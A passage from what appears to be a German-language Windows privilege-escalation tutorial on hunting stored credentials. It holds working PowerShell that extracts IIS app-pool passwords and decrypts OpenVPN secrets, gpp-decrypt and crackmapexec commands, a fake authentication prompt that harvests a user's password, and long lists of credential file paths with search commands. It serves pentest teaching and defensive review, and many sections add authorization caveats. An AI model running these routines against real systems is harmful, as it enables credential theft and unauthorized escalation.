    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist.\
Installationsprogramme werden mit **SYSTEM-Berechtigungen ausgeführt**; viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Anmeldedaten)

### Anmeldedaten-Artefakte in der Registry von Support-Tools

Einige ältere Fernsupport-Installationen behalten passwortbezogene Wertnamen unter festgelegten Anwendungs-Registry-Schlüsseln. So kennzeichnete `SecurityPasswordAES` von TeamViewer laut der [Erklärung des Anbieters zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamen-Marker ist lediglich ein Ansatzpunkt für die Überprüfung: Prüfe die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor du diese Zugangsdaten bewertest. Um von einem Fernsupport-Passwort zu einem privilegierteren Windows-Konto zu gelangen, müssen das Passwort tatsächlich wiederverwendet werden und eine Berechtigung für dieses Konto vorliegen. Gib Chiffretext und wiederhergestellte Passwörter nicht in routinemäßigen Enumeration-Ausgaben aus.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn der Verdacht besteht, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheide zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft gibt an](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung steuert und kein Sicherheitsfeature ist; er belegt für sich genommen nicht, dass die Inhalte der Arbeitsmappe verschlüsselt sind. Prüfe nur autorisierte und relevante Dateien und vermeide es, bei einer breit angelegten Enumeration mögliche Geheimnisse auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Anmeldedaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen hat. Überprüfe die tatsächlichen Daten und die aktuellen Kontoberechtigungen separat.

### In CI-Servern gespeicherte Änderungspatches

Ein CI-Server kann eingereichte Quellcodeänderungen auch nach Abschluss des Builds in seinem Datenverzeichnis behalten. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Änderungen aus Remote-Runs; das Datenverzeichnis kann konfiguriert sein und liegt nicht unbedingt unter `ProgramData`. Ein lesbarer Patch kann entfernte oder hinzugefügte Verweise auf eine Anmeldedatendatei, einen Verschlüsselungsschlüssel oder ein Skript enthalten, das beides verwendet. Ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` benötigt beispielsweise sowohl den AES-Schlüssel als auch die verschlüsselte Zeichenfolge; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Prüfe zuerst nur die Namen zugänglicher Patches und untersuche anschließend relevante Inhalte mit entsprechender Autorisierung, ohne Geheimnisse in routinemäßigen Enumeration-Ausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Anmeldedaten noch Zugriff mit höheren Berechtigungen. Beschränke den Zugriff auf das Datenverzeichnis über ACLs und vermeide es, Geheimnisse in Build-Änderungen aufzunehmen.

### Benutzerdefinierte Rotation lokaler Administratorpasswörter

Ein selbst entwickelter Passwort-Rotator kann ein verschlüsseltes lokales Administratorpasswort in einem lokalen Dienst speichern und dessen Datenspeicher-Anmeldedaten in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei aufbewahren. Prüfe gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen für den Datenspeicher. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Anmeldedaten weiterhin erreichbar, aber die Authentifizierung allein beweist nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn der Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfe die genaue Schlüsselableitung, bevor du der Verschlüsselung vertraust. Ein Verfahren, das einen AES-Schlüssel deterministisch aus einem offengelegten Seed mit Go's [`math/rand`](https://pkg.go.dev/math/rand) ableitet, eignet sich nicht zum Schutz dieses Passworts; Go weist darauf hin, dass dieses Paket für sicherheitssensible Zufallswerte ungeeignet ist. Stelle sicher, dass ein wiederhergestelltes Passwort aktuell ist und zu einem Konto in der lokalen Gruppe „Administratoren“ gehört, bevor du es als möglichen Eskalationspfad behandelst. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Blob beweist keine dieser Bedingungen. Gib Passwörter und Schlüsselmaterial nicht in routinemäßigen Enumeration-Ausgaben aus.

Verwende [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorpasswörter. Die Verzeichnis- oder Entra-basierte Speicherung und die zugehörigen Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) legen ebenfalls fest, ob ein authentifizierter Datenspeicher-Benutzer einen bestimmten Index lesen darf.

### Java-Server-Plugin-Archive und Wiederverwendung von Anmeldedaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers verteilt. Ein lesbares benutzerdefiniertes Plugin kann Konfigurationen oder Bytecode mit eingebetteten Dienst-Anmeldedaten enthalten. Untersuche das Archiv nur mit entsprechender Autorisierung und gib wiederhergestellte Geheimnisse nicht in routinemäßigen Enumeration-Ausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist. Ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Prüfe die relevanten Datei-ACLs und ersetze wiederverwendete Anmeldedaten durch separate Geheimnisse. Informationen zur Verzeichnisstruktur findest du in der [Plugin-Installationsanleitung von PaperMC](https://docs.papermc.io/paper/adding-plugins/) und zu Archivinhalten in der [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Anmeldedaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfe gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut der [Dokumentation zum Openfire-Benutzeranbieter](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder mit einem in dieser Eigenschaft gespeicherten Schlüssel verschlüsselt abgelegt werden. Ein wiederhergestelltes Passwort ist für eine Eskalation nur dann relevant, wenn es noch für eine privilegiertere Identität gültig ist; der Dateiname allein beweist weder Lesezugriff noch die Wiederverwendung von Anmeldedaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme. Gib Datenbankinhalte und Anmeldedaten nicht in routinemäßigen Enumeration-Ausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Admin-Konsole offenlegen, auch wenn eine externe Datenbank verwendet wird. Openfire bindet seine Admin-Konsole üblicherweise an Loopback; ein lokales Konto kann die Adresse trotzdem erreichen, sofern der Listener läuft. Prüfe gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für Plugin-Uploads und die Openfire-Dienstidentität. Ein Admin, der ein Plugin installieren kann, kann möglicherweise bewirken, dass Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann hoch privilegiert sein, wenn der Dienst als LocalSystem läuft. Ein übereinstimmendes Kontopasswort oder ein lesbarer Konfigurationspfad allein beweist weder den Zugriff auf die Admin-Konsole noch die Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Anbieters](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, die üblicherweise `server.config.yaml` heißen, können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit niedrigeren Berechtigungen diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; sie zu finden, belegt keinen Zugriff auf die Server-CA. Bei manchen Bereitstellungen wird der private CA-Schlüssel offline aufbewahrt, sodass eine lesbare Serverkonfiguration den Signierschlüssel möglicherweise nicht enthält.

Prüfe auf einem Windows-Server die ACL der **Server**konfiguration im Installationsverzeichnis und aller geschützten Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwende den für den Dienst konfigurierten Pfad, falls dieser abweicht. Stelle sicher, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Gib den privaten Schlüssel nicht in Protokollen oder Enumeration-Ausgaben aus. Der Workflow `config api_client` des Anbieters verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen, doch es ist auch eine wirksame serverseitige Rolle erforderlich. Eine solche Rolle zu erstellen oder zu ändern, kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine vorhandene privilegierte Serveridentität kann einen Zugriffsweg bieten, selbst wenn diese Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im jeweiligen Server- oder Agentenkontext, der hoch privilegiert sein kann.

Schütze die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahre den CA-Signierschlüssel nach Möglichkeit offline auf und beschränke API-Rollen und Listener-Zugriff. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitungen zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### Putty-Anmeldedaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungs-Backup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds’ Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; das [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Prüfen Sie zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das Passwort noch beweist es, dass gespeicherte Anmeldedaten noch gültig sind oder höhere Berechtigungen haben.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Private-Keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du innerhalb dieses Pfads einen Eintrag findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht ausgeführt wird und du möchtest, dass er beim Systemstart automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH an einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und procmon hat bei der asymmetrischen Schlüssel-Authentifizierung keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können ebenfalls offline `SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Prüfe vorrangig lokal zugängliche Backup- oder Image-Verzeichnisse und untersuche die **Membernamen** eines Images, bevor du etwas extrahierst; ein `.wim`-Dateiname allein beweist nicht, dass Hives offengelegt sind, und gängige `install.wim`-, `boot.wim`- und Recovery-Images sind häufige Fehlalarme. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe zum Scope gehört. Siehe Microsofts [Anleitung zu Windows-Images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [Referenz zu Registry-Hive-Dateien](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Zugangsdaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens waren die als XML-Dateien in SYSVOL gespeicherten Group Policy Objects (GPOs) für jeden Domänenbenutzer zugänglich. Zweitens konnten die mit AES256 verschlüsselten Passwörter in diesen GPPs von jedem authentifizierten Benutzer entschlüsselt werden, da der Standardschlüssel öffentlich dokumentiert war. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld „cpassword“ sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Angaben zum GPP und zum Speicherort der Datei und erleichtert so die Erkennung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec verwenden, um an die Passwörter zu gelangen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem ausgelieferten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfen Sie den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor Sie es als Sicherheitsrisiko einstufen. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne die Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass das Archiv ein Geheimnis enthält, noch, dass mit einer gefundenen Zugangsinformation höhere Rechte erlangt werden können.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den Benutzer jederzeit **auffordern, seine Zugangsdaten oder sogar die eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder in **Base64** enthielten.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Dateinamenlisten-Variante ohne die Password-Safe-Erweiterung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Betrachte einen passenden Dateinamen als Hinweis auf einen verschlüsselten Tresor; sein Vorhandensein bedeutet nicht, dass du ihn lesen, entsperren oder gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Untersuchung des Speicherorts solcher Dateien zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls lediglich ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren sind das tatsächliche Master-Passwort und alle konfigurierten Schlüsseldateien oder Kontofaktoren erforderlich. Falls eine autorisierte Prüfung ein LM:NT-Hash-Paar in einem Eintrag findet, überprüfe das genannte Konto und ob der NT-Hash aktuell und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag verleiht für sich genommen keine Administrator- oder SYSTEM-Rechte; auch der Zugriff auf Remote-Dienste, Kontoberechtigungen und jeder separate Schritt zur Dienstausführung müssen gegeben sein. Das Inventar sollte den Tresorpfad und die Lesbarkeit angeben, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Suchbefehl-Variante ohne die Password-Safe-Erweiterung

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Du solltest auch den Papierkorb nach Zugangsdaten durchsuchen.

